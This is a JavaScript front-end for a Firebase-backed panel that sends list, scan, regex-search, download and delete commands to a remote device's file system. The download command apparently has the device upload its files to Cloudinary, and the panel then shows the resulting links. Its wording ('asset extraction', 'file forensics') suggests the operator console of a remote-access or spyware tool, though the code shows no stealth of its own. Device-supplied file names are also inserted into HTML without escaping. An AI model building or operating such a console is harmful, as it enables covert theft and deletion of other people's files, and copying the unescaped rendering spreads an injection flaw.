import { db, auth } from '../api/firebase.js';
import { getAuth, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js';
import { getDatabase, ref, get, set, onValue } from 'https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js';

let currentUid = null;
let responseUnsubscribe = null;
let progressUnsubscribe = null;
let urlsUnsubscribe = null;
let stateUnsubscribe = null;

const navigationHistory = [];
let currentPath = '/';
let cachedFiles = {};
let isDownloadComplete = false;
let urlsVisible = false;
let currentViewMode = 'list';
let cachedUrls = [];

const professionalMessages = {
    list: "📁 Directory enumeration initiated",
    scan: "🔍 Comprehensive device scan launched",
    tree: "🌳 Hierarchical file tree generation started",
    search: "🔎 Advanced regex pattern matching deployed",
    download: "☁️ Cloudinary asset extraction commenced",
    delete: "🗑️ Secure file deletion operation triggered",
    info: "🔍 Detailed file forensics analysis requested",
    success: "✅ Operation completed successfully",
    error: "❌ Command execution failed"
};

const deviceId = await getDeviceIdSafe();

export async function getDeviceIdSafe() {
    return new Promise((resolve, reject) => {
        onAuthStateChanged(auth, async (user) => {
            if (!user) return reject("Not logged in");

            const snap = await get(ref(db, `users/${user.uid}/storeId`));
            resolve(snap.val());
        });
    });
}

// 🔥 VIEW MODE TOGGLE
window.setViewMode = function(mode) {
    currentViewMode = mode;
    document.getElementById('listViewBtn').className = mode === 'list' ? 'elite-btn elite-btn-primary' : 'elite-btn elite-btn-secondary';
    document.getElementById('gridViewBtn').className = mode === 'grid' ? 'elite-btn elite-btn-primary' : 'elite-btn elite-btn-secondary';

    if (urlsVisible) {
        renderUrlsInGrid();
    } else if (cachedFiles[currentPath]) {
        displayFileList(cachedFiles[currentPath]);
    }
};

// 🔥 1. WINDOW LOAD - AUTO LIST ROOT
window.addEventListener('load', function() {
    setTimeout(() => {
        if (currentUid) {
            executeCommand('list', '/');
        }
    }, 1000);
});

// 🔥 STATE LISTENER FOR SCAN PROGRESS
function startStateListener() {
    if (stateUnsubscribe) stateUnsubscribe();
    const stateRef = ref(db, `users/${currentUid}/devices/${deviceId}/fileManager/state`);
    stateUnsubscribe = onValue(stateRef, (snapshot) => {
        const state = snapshot.val();
        if (state) {
            document.getElementById('operationStatus').textContent = state.busy ?
                `Busy: ${state.error || state.progress + '%'}` : 'Idle';

            if (state.action === 'scan') {
                document.getElementById('totalFiles').textContent = state.progress || 0;
            }
        }
    });
}

// 🔥 URLS LISTENER - STORES URL DATA ONLY, NO THUMBNAILS
function startUrlsListener() {
    if (urlsUnsubscribe) urlsUnsubscribe();
    const urlsRef = ref(db, `users/${currentUid}/devices/${deviceId}/fileManager/urls`);
    urlsUnsubscribe = onValue(urlsRef, (snapshot) => {
        const urlsData = snapshot.val();
        const urlsCountNav = document.getElementById('urlsCountNav');

        if (urlsData) {
            cachedUrls = Object.values(urlsData);
            urlsCountNav.textContent = cachedUrls.length;
            document.getElementById('urlsToggleBtn').style.display = 'flex';

            if (urlsVisible) {
                renderUrlsInGrid();
            }
        } else {
            cachedUrls = [];
            document.getElementById('urlsToggleBtn').style.display = 'none';
        }
    });
}

// 🔥 RENDER URLs IN THE SAME FILE GRID - NO THUMBNAIL READING
function renderUrlsInGrid() {
    const fileGrid = document.getElementById('fileGrid');

    if (cachedUrls.length === 0) {
        fileGrid.innerHTML = '<div style="text-align: center; padding: 80px;"><i class="fas fa-link" style="font-size:4rem;opacity:0.5"></i><div>No URLs available</div></div>';
        return;
    }

    if (currentViewMode === 'list') {
        fileGrid.innerHTML = cachedUrls.map(urlData => `
            <div class="file-item-elite" style="cursor: pointer;">
                <div class="file-icon-elite" style="background: #10b981; position: relative;">
                    <i class="fas fa-link"></i>
                </div>
                <div class="file-info-elite" style="flex: 1;">
                    <div class="file-name-elite">${urlData.name}</div>
                    <div class="file-meta">
                        <span>${urlData.size || 'N/A'}</span>
                        <span style="word-break: break-all; max-width: 400px; display: inline-block; overflow: hidden; text-overflow: ellipsis;">${urlData.url}</span>
                    </div>
                </div>
                <div class="file-actions-elite">
                    <a href="${urlData.url}" target="_blank" class="action-btn-elite action-cloud" onclick="event.stopPropagation();">
                        <i class="fas fa-external-link-alt"></i>
                    </a>
                    <button class="action-btn-elite action-info" onclick="event.stopPropagation(); copyUrl('${urlData.url}')">
                        <i class="fas fa-copy"></i>
                    </button>
                </div>
            </div>
        `).join('');
    } else {
        fileGrid.innerHTML = `<div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 16px; width: 100%;">
            ${cachedUrls.map(urlData => `
                <div class="file-item-elite" style="flex-direction: column; padding: 16px; text-align: center; aspect-ratio: 1; justify-content: center;">
                    <div class="file-icon-elite" style="background: #10b981; width: 56px; height: 56px; margin-bottom: 12px; position: relative; border-radius: 12px;">
                        <i class="fas fa-link" style="font-size: 1.4rem; margin-top: 8px;"></i>
                    </div>
                    <div class="file-name-elite" style="font-size: 0.85rem; margin-bottom: 8px; word-break: break-word;">${urlData.name}</div>
                    <div style="font-size: 0.75rem; opacity: 0.7; margin-bottom: 12px;">${urlData.size || 'N/A'}</div>
                    <div style="display: flex; gap: 8px; justify-content: center;">
                        <a href="${urlData.url}" target="_blank" class="action-btn-elite action-cloud" style="width: 36px; height: 36px;">
                            <i class="fas fa-external-link-alt"></i>
                        </a>
                        <button class="action-btn-elite action-info" onclick="copyUrl('${urlData.url}')" style="width: 36px; height: 36px;">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
            `).join('')}
        </div>`;
    }
}

onAuthStateChanged(auth, (user) => {
    if (user) {
        currentUid = user.uid;
        document.getElementById('deviceStatus').textContent = '✅ Connected';
        startResponseListener();
        startStateListener();
        startUrlsListener();
    } else {
        document.getElementById('deviceStatus').textContent = '❌ Disconnected';
    }
});

// 🔥 NEW MANUAL PATH SEARCH
window.searchManualPath = function() {
    const path = document.getElementById('manualPathInput').value.trim();
    if (path) {
        listFilesAt(path);
        document.getElementById('manualPathInput').value = '';
        showNotification(`📁 Navigating to: ${path}`, 'info');
    }
};

// 🔥 URLS TOGGLE - NOW SHOWS IN SAME GRID
window.toggleCloudUrls = function() {
    urlsVisible = !urlsVisible;
    const urlsBtn = document.getElementById('urlsToggleBtn');

    if (urlsVisible) {
        urlsBtn.innerHTML = `<i class="fas fa-folder"></i> Files`;
        urlsBtn.className = 'elite-btn elite-btn-secondary';
        renderUrlsInGrid();
    } else {
        urlsBtn.innerHTML = `<i class="fas fa-link"></i> URLs (<span id="urlsCountNav">${cachedUrls.length}</span>)`;
        urlsBtn.className = 'elite-btn elite-btn-success';
        if (cachedFiles[currentPath]) {
            displayFileList(cachedFiles[currentPath]);
        } else {
            executeCommand('list', currentPath);
        }
    }
};

// 🔥 FIXED COMMAND EXECUTOR
window.executeCommand = async function(action, path = '/', searchPattern = '') {
    if (!currentUid) {
        showNotification('🔒 Authentication required', 'error');
        return;
    }

    if (action === 'download') {
        isDownloadComplete = false;
        const filename = path.split('/').pop() || 'file';
        showDownloadLoader(filename);
        watchDownloadProgress();
    }

    if (action === 'list' && path !== currentPath) {
        navigationHistory.push(currentPath);
        updateBackButton();
    }

    const commandRef = ref(db, `users/${currentUid}/devices/${deviceId}/fileManager/command`);
    const commandData = {
        action: action,
        path: path || '/',
        searchPattern: searchPattern || '',
        timestamp: Date.now()
    };

    try {
        await set(commandRef, commandData);
        document.getElementById('operationStatus').textContent = `Executing: ${action.toUpperCase()}`;
        showNotification(professionalMessages[action] || `🚀 ${action.toUpperCase()} deployed`, 'info');
        currentPath = path;
        updatePathDisplay(path);

        if (action === 'list') {
            urlsVisible = false;
            const urlsBtn = document.getElementById('urlsToggleBtn');
            if (urlsBtn.style.display !== 'none') {
                urlsBtn.innerHTML = `<i class="fas fa-link"></i> URLs (<span id="urlsCountNav">${cachedUrls.length}</span>)`;
                urlsBtn.className = 'elite-btn elite-btn-success';
            }
        }
    } catch (error) {
        showNotification('💥 Command transmission failed', 'error');
    }
};

// 🔥 ALL OTHER FUNCTIONS REMAIN SAME
function startResponseListener() {
    if (responseUnsubscribe) responseUnsubscribe();
    const responseRef = ref(db, `users/${currentUid}/devices/${deviceId}/fileManager/result`);
    responseUnsubscribe = onValue(responseRef, (snapshot) => {
        const data = snapshot.val();
        if (!data) return;

        console.log('📱 Response:', data);

        switch (data.action || data.status) {
            case 'list':
                cachedFiles[currentPath] = data;
                displayFileList(data);
                break;
            case 'scan':
                displayScanResults(data);
                break;
            case 'search':
                displaySearchResults(data);
                break;
            case 'download':
                handleCloudinaryUpload(data);
                break;
            case 'delete':
                handleDeleteResponse(data);
                break;
            case 'info':
                displayFileInfo(data);
                break;
            case 'error':
                showNotification('❌ ' + (data.message || professionalMessages.error), 'error');
                closeDownloadLoader();
                break;
        }
    });
}

function handleCloudinaryUpload(data) {
    if (data.url && !isDownloadComplete) {
        isDownloadComplete = true;
        closeDownloadLoader();
        showNotification('☁️ Cloudinary extraction complete', 'success');
    }
}

function handleDeleteResponse(data) {
    showNotification('🗑️ File deleted successfully', 'success');
    refreshCurrent();
}

// 🔥 DISPLAY FILE LIST - NO THUMBNAIL READING
function displayFileList(data) {
    const fileGrid = document.getElementById('fileGrid');
    document.getElementById('totalFiles').textContent = data.total || 0;

    if (!data.items || data.items.length === 0) {
        fileGrid.innerHTML = '<div style="text-align: center; padding: 80px;"><i class="fas fa-folder-open" style="font-size:4rem;opacity:0.5"></i><div>Directory is empty</div></div>';
        return;
    }

    if (currentViewMode === 'list') {
        fileGrid.innerHTML = data.items.map(item => `
            <div class="file-item-elite" onclick="listFilesAt('${item.path}')" style="cursor:${item.isDir ? 'pointer' : 'default'};">
                <div class="file-icon-elite" style="background: ${item.isDir ? '#667eea' : '#10b981'}; position: relative;">
                    ${item.isDir ? '<i class="fas fa-folder"></i>' : '<i class="fas fa-file"></i>'}
                </div>
                <div class="file-info-elite">
                    <div class="file-name-elite">${item.name}</div>
                    <div class="file-meta">
                        <span>${item.size}</span>
                        <span>${new Date(item.modified).toLocaleString()}</span>
                    </div>
                </div>
                <div class="file-actions-elite">
                    ${!item.isDir ? `
                        <button class="action-btn-elite action-cloud" onclick="event.stopPropagation(); executeCommand('download', '${item.path}')">
                            <i class="fas fa-cloud-arrow-up"></i>
                        </button>
                        <button class="action-btn-elite action-delete" onclick="event.stopPropagation(); executeCommand('delete', '${item.path}')">
                            <i class="fas fa-trash"></i>
                        </button>
                        <button class="action-btn-elite action-info" onclick="event.stopPropagation(); executeCommand('info', '${item.path}')">
                            <i class="fas fa-info-circle"></i>
                        </button>
                    ` : ''}
                </div>
            </div>
        `).join('');
    } else {
        fileGrid.innerHTML = `<div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 16px; width: 100%;">
            ${data.items.map(item => `
                <div class="file-item-elite" onclick="listFilesAt('${item.path}')" style="flex-direction: column; padding: 12px; text-align: center; cursor:${item.isDir ? 'pointer' : 'default'}; aspect-ratio: 1; justify-content: center;">
                    <div class="file-icon-elite" style="background: ${item.isDir ? '#667eea' : '#10b981'}; width: 64px; height: 64px; margin: 0 auto 12px; position: relative; border-radius: 12px;">
                        ${item.isDir ? '<i class="fas fa-folder" style="font-size: 1.6rem; margin-top: 12px;"></i>' : '<i class="fas fa-file" style="font-size: 1.6rem; margin-top: 12px;"></i>'}
                    </div>
                    <div class="file-name-elite" style="font-size: 0.85rem; margin-bottom: 4px; word-break: break-word; max-height: 40px; overflow: hidden;">${item.name}</div>
                    <div style="font-size: 0.75rem; opacity: 0.7; margin-bottom: 8px;">${item.size}</div>
                    ${!item.isDir ? `
                        <div style="display: flex; gap: 6px; justify-content: center;">
                            <button class="action-btn-elite action-cloud" onclick="event.stopPropagation(); executeCommand('download', '${item.path}')" style="width: 32px; height: 32px;">
                                <i class="fas fa-cloud-arrow-up"></i>
                            </button>
                            <button class="action-btn-elite action-delete" onclick="event.stopPropagation(); executeCommand('delete', '${item.path}')" style="width: 32px; height: 32px;">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    ` : ''}
                </div>
            `).join('')}
        </div>`;
    }
}

function displayScanResults(data) {
    document.getElementById('totalFiles').textContent = data.totalFiles || 0;
    document.getElementById('searchResults').textContent = data.totalFiles || 0;
    showNotification(`✅ Indexed ${data.totalFiles?.toLocaleString()} files`, 'success');
    displayFileList({ items: (data.files || []).slice(0, 100), total: data.totalFiles });
}

function displaySearchResults(data) {
    document.getElementById('searchResults').textContent = data.totalFound || 0;
    document.getElementById('totalFiles').textContent = data.totalFound || 0;
    displayFileList({ items: data.files || [], total: data.totalFound });
    showNotification(`✅ ${data.totalFound} matches located`, 'success');
}

function displayFileInfo(data) {
    const info = data.fileInfo || {};
    const fileGrid = document.getElementById('fileGrid');

    fileGrid.innerHTML = `
        <div style="padding: 40px; max-width: 900px; margin: 0 auto;">
            <div style="text-align: center; margin-bottom: 40px;">
                <div style="font-size: 2.8rem; margin-bottom: 16px; color: #00d4ff;">📊</div>
                <div style="font-size: 1.6rem; font-weight: 600; color: #fff; margin-bottom: 8px;">File Forensics Analysis</div>
                <div style="color: #94a3b8; font-size: 1rem;">Detailed metadata extraction complete</div>
            </div>
            <div style="background: rgba(255,255,255,0.08); padding: 36px; border-radius: 20px; border: 1px solid rgba(0,212,255,0.2);">
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px;">
                    <div>
                        <div style="font-size: 0.85rem; opacity: 0.7; margin-bottom: 8px; text-transform: uppercase;">Filename</div>
                        <div style="font-weight: 600; font-size: 1.2rem;">${info.name || 'N/A'}</div>
                    </div>
                    <div>
                        <div style="font-size: 0.85rem; opacity: 0.7; margin-bottom: 8px; text-transform: uppercase;">Full Path</div>
                        <div style="font-size: 0.92rem; opacity: 0.9; word-break: break-all; font-family: monospace;">${info.path || 'N/A'}</div>
                    </div>
                    <div>
                        <div style="font-size: 0.85rem; opacity: 0.7; margin-bottom: 8px; text-transform: uppercase;">Size</div>
                        <div style="font-weight: 600; font-size: 1.1rem; color: #10b981;">${info.size || 'N/A'}</div>
                    </div>
                    <div>
                        <div style="font-size: 0.85rem; opacity: 0.7; margin-bottom: 8px; text-transform: uppercase;">Last Modified</div>
                        <div style="font-size: 0.95rem;">${info.modified ? new Date(info.modified).toLocaleString() : 'N/A'}</div>
                    </div>
                    <div>
                        <div style="font-size: 0.85rem; opacity: 0.7; margin-bottom: 8px; text-transform: uppercase;">Permissions</div>
                        <div style="display: flex; gap: 16px; font-size: 1.2rem; flex-wrap: wrap;">
                            ${info.canRead ? '✅ Read' : '❌ Read'} ${info.canWrite ? '✅ Write' : '❌ Write'} ${info.isHidden ? '🔒 Hidden' : '📂 Visible'}
                        </div>
                    </div>
                    ${info.blockSize ? `
                    <div>
                        <div style="font-size: 0.85rem; opacity: 0.7; margin-bottom: 8px; text-transform: uppercase;">Storage Stats</div>
                        <div style="font-size: 0.9rem;">
                            ${Math.round((info.availableBlocks / info.totalBlocks) * 100)}% Free Space<br>
                            Block Size: ${(info.blockSize / 1024).toFixed(0)}KB
                        </div>
                    </div>` : ''}
                </div>
            </div>
            <div style="text-align: center; margin-top: 36px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;">
                <button class="elite-btn elite-btn-primary" onclick="executeCommand('download', '${info.path}')" style="padding: 14px 28px;">
                    <i class="fas fa-cloud-arrow-up"></i> Extract to Cloudinary
                </button>
                <button class="elite-btn elite-btn-secondary" onclick="refreshCurrent()" style="padding: 14px 28px;">
                    <i class="fas fa-sync-alt"></i> Return to Directory
                </button>
            </div>
        </div>
    `;
    showNotification(professionalMessages.info, 'success');
    document.getElementById('operationStatus').textContent = 'Forensics Complete';
}

// 🔥 ALL UTILITY FUNCTIONS
window.listFilesAt = function(path) {
    executeCommand('list', path);
};

window.refreshCurrent = function() {
    if (cachedFiles[currentPath]) {
        displayFileList(cachedFiles[currentPath]);
        showNotification('🔄 Refreshed from cache', 'success');
    } else {
        executeCommand('list', currentPath);
    }
};

function updatePathDisplay(path) {
    document.getElementById('currentPath').textContent = path;
    document.getElementById('currentPathDisplay').textContent = path;
}

window.goBack = function() {
    if (navigationHistory.length > 0) {
        const previousPath = navigationHistory.pop();
        listFilesAt(previousPath);
        updateBackButton();
    } else {
        showNotification('📍 Navigation history exhausted', 'warning');
    }
};

function updateBackButton() {
    document.getElementById('backBtn').style.display = navigationHistory.length > 0 ? 'flex' : 'none';
}

window.copyUrl = function(url) {
    navigator.clipboard.writeText(url);
    showNotification('🔗 URL copied to clipboard', 'success');
};

window.closeDownloadLoader = function() {
    document.getElementById('downloadLoader').style.display = 'none';
    isDownloadComplete = false;
};

// 🔥 ALL MODAL FUNCTIONS
window.showDownloadLoader = function(filename) {
    document.getElementById('downloadLoader').style.display = 'flex';
    document.getElementById('loaderFilename').textContent = `Cloudinary Upload: ${filename}`;
    document.getElementById('loaderTitle').textContent = 'Executing DOWNLOAD...';
    document.getElementById('loaderPercent').textContent = '0%';
};

window.updateDownloadProgress = function(progress) {
    if (isDownloadComplete) return;
    const percent = progress.match(/\d+/)?.[0] || 0;
    const loaderCircle = document.querySelector('#downloadLoader .loader-circle');
    const clampedPercent = Math.max(0, Math.min(100, parseInt(percent)));
    loaderCircle.style.setProperty('--loader-progress', `${clampedPercent}%`);
    document.getElementById('loaderPercent').textContent = `${clampedPercent}%`;
};

function watchDownloadProgress() {
    if (progressUnsubscribe) progressUnsubscribe();
    const progressRef = ref(db, `users/${currentUid}/devices/${deviceId}/fileManager/result`);
    progressUnsubscribe = onValue(progressRef, (snapshot) => {
        const data = snapshot.val();
        if (data && data.progress && data.action === 'download') {
            updateDownloadProgress(data.progress);
        }
    });
}

window.executeSearch = function() {
    const pattern = document.getElementById('regexPattern').value;
    if (!pattern) return showNotification('🔎 Search pattern required', 'error');
    executeCommand('search', '/', pattern);
    closeSearchModal();
};

window.performSearch = function() {
    const pattern = document.getElementById('searchInput').value;
    executeCommand('search', currentPath, pattern);
    toggleAdvancedSearch();
};

window.toggleAdvancedSearch = function() {
    document.getElementById('searchControls').style.display =
        document.getElementById('searchControls').style.display === 'none' ? 'flex' : 'none';
};

window.openSearchModal = function() {
    document.getElementById('searchModal').style.display = 'flex';
};

window.closeSearchModal = function() {
    document.getElementById('searchModal').style.display = 'none';
};

window.closeProgressModal = function() {
    document.getElementById('progressModal').style.display = 'none';
};

window.testRegex = function() {
    const pattern = document.getElementById('regexPattern').value;
    showNotification(`✅ Regex pattern "${pattern}" is valid`, 'success');
};

function showNotification(message, type) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.className = `notification ${type} show`;
    setTimeout(() => {
        notification.classList.remove('show');
    }, 4000);
}

window.addEventListener('beforeunload', () => {
    if (responseUnsubscribe) responseUnsubscribe();
    if (progressUnsubscribe) progressUnsubscribe();
    if (urlsUnsubscribe) urlsUnsubscribe();
    if (stateUnsubscribe) stateUnsubscribe();
});